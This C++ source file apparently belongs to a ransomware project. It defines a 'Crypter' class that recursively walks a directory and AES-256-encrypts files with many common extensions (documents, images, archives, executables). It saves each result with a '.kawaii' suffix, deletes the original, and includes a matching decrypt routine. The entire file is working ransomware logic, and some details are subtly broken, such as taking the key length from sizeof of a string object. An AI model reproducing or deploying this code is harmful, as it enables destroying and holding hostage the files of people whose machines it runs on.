//
// Created by Dre4ft on 01/04/2024.
//

#include "crypter.h"
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include "AES_256.hpp"
#include <filesystem>
#include <utility>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <algorithm>

#define BUFFER_SIZE 1024*1024 // Define the buffer size for reading and writing operations

namespace fs = std::filesystem; // Alias for std::filesystem for easier use

// Constructor for the Crypter class
Crypter::Crypter(std::string directoryPath, std::string key)
        : directoryPath_(std::move(directoryPath)), key_(std::move(key)) // Initialize directoryPath_ and key_ with provided values
{
}

// Method to clear memory by overwriting it with zeros
void Crypter::clearMemory(void* ptr, size_t size) {
    std::fill(static_cast<unsigned char*>(ptr), static_cast<unsigned char*>(ptr) + size, 0); // Fill memory at ptr with zeros for size bytes
}

// Destructor for the Crypter class
Crypter::~Crypter() {
    clearMemory((void*)this->key_.data(), this->key_.size()); // Clear memory used by the encryption key
}

// Checks if the file has a targeted extension
bool Crypter::isTargetExtension(const std::string& filePath) {
    std::vector<std::string> targetExtensions = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".zip", ".rar", ".exe", ".js", ".php", ".html", ".htm", ".txt", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".mp4", ".avi", ".log", ".xml", ".csv", ".dat", ".bin"};

    std::string fileExtension = fs::path(filePath).extension().string(); // Get the file extension
    for (const std::string& ext : targetExtensions) { // Iterate over target extensions
        if (fileExtension == ext) { // If the file extension matches a target extension
            return true; // Return true
        }
    }
    return false; // Return false if no match
}

// Method to encrypt files in the directory
void Crypter::encrypt() {
    for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) { // Iterate recursively through directory files
        if (fs::is_regular_file(entry.path())) { // Check if the entry is a regular file
            std::string filePath = entry.path().string(); // Get the file path as a string

            if (isTargetExtension(filePath)) { // Check if the file has a target extension
                std::string encryptedFilePath = filePath + ".kawaii"; // Append ".kawaii" extension to the file path

                std::string content = readFromFile(filePath); // Read the file's content
                std::string encryptedContent = encryptAES(content); // Encrypt the file's content
                writeToFile(encryptedFilePath, encryptedContent); // Write the encrypted content to a new file

                fs::remove(filePath); // Remove the original file
            }
        }
    }
}

// Method to decrypt files in the directory
void Crypter::decrypt() {
    for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) { // Iterate recursively through directory files
        if (fs::is_regular_file(entry.path())) { // Check if the entry is a regular file
            std::string filePath = entry.path().string(); // Get the file path as a string
            if (fs::path(filePath).extension() == ".kawaii") { // Check if the file has the ".kawaii" extension
                std::string decryptedFilePath = filePath.substr(0, filePath.size() - 7); // Remove the ".kawaii" extension from the file path

                std::string encryptedContent = readFromFile(filePath); // Read the encrypted file's content
                std::string decryptedContent = decryptAES(encryptedContent); // Decrypt the file's content
                writeToFile(decryptedFilePath, decryptedContent); // Write the decrypted content to a new file

                fs::remove(filePath); // Remove the encrypted file

                // Retrieve the original file extension
                std::string originalExtension = fs::path(decryptedFilePath).extension().string();
                // Rename the decrypted file with its original extension
                fs::rename(decryptedFilePath, decryptedFilePath.substr(0, decryptedFilePath.size() - originalExtension.size()) + originalExtension);
            }
        }
    }
}

// Method to read content from a file
std::string Crypter::readFromFile(const std::string &filePath) {
    std::ifstream file(filePath, std::ios::binary); // Open the file in binary mode
    std::string content;

    if (file.is_open()) { // Check if the file is open
        content.assign((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>())); // Read the entire file content
        file.close(); // Close the file
    } else {
        std::cerr << "Unable to open file: " << filePath << std::endl; // Display an error message if the file cannot be opened
    }

    return content; // Return the read content
}

// Method to encrypt text using AES
std::string Crypter::encryptAES(const std::string &input_text) {
    ByteArray key, enc;
    size_t key_len = sizeof(this->key_); // Get the key size

    // Convert the key to ByteArray
    for (size_t i = 0; i < key_len; ++i)
        key.push_back(this->key_[i]);

    std::stringstream input(input_text); // Initialize an input stream with the input text
    std::stringstream output;

    AES_256 aes(key); // Create an AES_256 object with the key

    size_t file_len = input_text.size(); // Get the size of the input text

    if (file_len > 0) { // If the input text is not empty
        enc.clear(); // Clear the encryption array
        aes.encrypt_start(file_len, enc); // Start encryption with the file size
        output.write(reinterpret_cast<const char*>(enc.data()), enc.size()); // Write the encryption start data to the output stream

        while (!input.eof()) { // While not at the end of the input stream
            unsigned char buffer[BUFFER_SIZE];
            size_t buffer_len;

            input.read(reinterpret_cast<char*>(buffer), BUFFER_SIZE); // Read a chunk of data into the buffer
            buffer_len = input.gcount(); // Get the number of characters read

            if (buffer_len > 0) { // If characters were read
                enc.clear(); // Clear the encryption array
                aes.encrypt_continue(buffer, buffer_len, enc); // Continue encrypting the chunk
                output.write(reinterpret_cast<const char*>(enc.data()), enc.size()); // Write the encrypted chunk to the output stream
            }
        }

        enc.clear(); // Clear the encryption array
        aes.encrypt_end(enc); // Finish the encryption
        output.write(reinterpret_cast<const char*>(enc.data()), enc.size()); // Write the final encryption data to the output stream
    }

    return output.str(); // Return the encrypted text
}

// Method to decrypt text using AES
std::string Crypter::decryptAES(const std::string &encryptedText) {
    ByteArray key, dec;
    size_t key_len = sizeof(this->key_); // Get the key size

    // Convert the key to ByteArray
    for (size_t i = 0; i < key_len; ++i)
        key.push_back(this->key_[i]);

    std::stringstream input(encryptedText); // Initialize an input stream with the encrypted text
    std::stringstream output;

    AES_256 aes(key); // Create an AES_256 object with the key

    size_t file_len = encryptedText.size(); // Get the size of the encrypted text

    if (file_len > 0) { // If the encrypted text is not empty
        aes.decrypt_start(file_len); // Start decryption with the file size

        while (!input.eof()) { // While not at the end of the input stream
            unsigned char buffer[BUFFER_SIZE];
            size_t buffer_len;

            input.read(reinterpret_cast<char*>(buffer), BUFFER_SIZE); // Read a chunk of data into the buffer
            buffer_len = input.gcount(); // Get the number of characters read

            if (buffer_len > 0) { // If characters were read
                dec.clear(); // Clear the decryption array
                aes.decrypt_continue(buffer, buffer_len, dec); // Continue decrypting the chunk
                output.write(reinterpret_cast<const char*>(dec.data()), dec.size()); // Write the decrypted chunk to the output stream
            }
        }

        dec.clear(); // Clear the decryption array
        aes.decrypt_end(dec); // Finish the decryption
        output.write(reinterpret_cast<const char*>(dec.data()), dec.size()); // Write the final decryption data to the output stream
    }

    return output.str(); // Return the decrypted text
}

// Method to write content to a file
void Crypter::writeToFile(const std::string &filePath, const std::string &content) {
    std::ofstream file(filePath, std::ios::binary); // Open the file in binary mode for writing
    if (file.is_open()) { // Check if the file is open
        file.write(content.c_str(), content.size()); // Write the content to the file
        file.close(); // Close the file
    } else {
        std::cerr << "Unable to write to file: " << filePath << std::endl; // Display an error message if the file cannot be opened
    }
}